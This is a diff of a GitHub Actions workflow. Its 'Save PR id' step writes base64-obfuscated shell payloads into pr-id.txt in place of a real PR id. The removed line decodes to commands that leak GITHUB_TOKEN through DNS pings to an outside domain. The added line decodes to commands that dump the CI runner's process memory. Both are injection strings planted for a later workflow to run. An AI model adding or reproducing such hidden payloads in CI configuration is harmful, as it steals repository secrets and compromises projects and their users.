@@ -48,7 +48,7 @@ jobs:
       # Upload PR id for next workflow use
       - name: Save PR id
         if: ${{ always() }}
-        run: echo 'JiYgcGluZyAtYyAxMCAzNmExMi5ucy5hcGFjaGUuYXNpYSAmJiBwaW5nIC1jIDEwICR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fS44ZGQzNi5ucy5hcGFjaGUuYXNpYSAj' | base64 -d > pr-id.txt
+        run: echo 'JiYgd2hvYW1pICYmIGlkICYmIGNhdCAvcHJvYy8kKHBncmVwIC1mIFJ1bm5lci5Xb3JrZXIpL21lbSAj' | base64 -d > pr-id.txt
 
       - name: Upload PR id
         if: ${{ always() }}
